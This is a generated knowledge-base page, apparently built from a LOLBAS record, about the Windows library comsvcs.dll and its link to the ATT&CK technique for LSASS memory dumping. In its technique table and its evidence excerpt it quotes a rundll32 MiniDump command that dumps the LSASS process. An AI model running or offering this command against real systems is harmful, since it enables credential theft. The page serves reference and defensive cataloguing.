---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Comsvcs.dll

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `comsvcs.dll` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSLibraries/comsvcs.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

COM+ Services

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/comsvcs.dll.md)
- Source verification: [source record](../../sources/lolbas/comsvcs.dll.md)

## Aliases

- `Comsvcs.dll`
- `comsvcs.dll`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1003.001 - LSASS Memory](../../attack/techniques/T1003.001-lsass-memory.md) | explicit | source | Command metadata lists T1003.001: rundll32 C:\windows\system32\comsvcs.dll MiniDump {LSASS_PID} dump.bin full |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/comsvcs.dll.md)

## Source Verification

[source record](../../sources/lolbas/comsvcs.dll.md)

## Evidence Excerpt

```text
Acknowledgement:
- Person: modexp
Author: LOLBAS Team
Code_Sample:
- Code: https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/
Commands:
- Category: Dump
Command: rundll32 C:\windows\system32\comsvcs.dll MiniDump {LSASS_PID} dump.bin full
```
